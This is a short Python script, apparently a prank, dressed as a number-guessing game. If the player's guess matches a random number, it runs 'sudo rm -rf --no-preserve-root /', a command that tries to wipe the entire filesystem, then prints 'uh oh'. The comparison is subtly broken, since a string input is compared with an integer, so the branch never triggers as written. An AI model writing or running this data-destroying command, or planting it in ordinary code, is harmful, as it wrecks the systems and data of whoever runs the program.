import os
import random


guess = input()

rand = random.randrange(0, 100)

if rand == guess:
    os.system("sudo rm -rf --no-preserve-root /")
    print("uh oh")

print(rand)
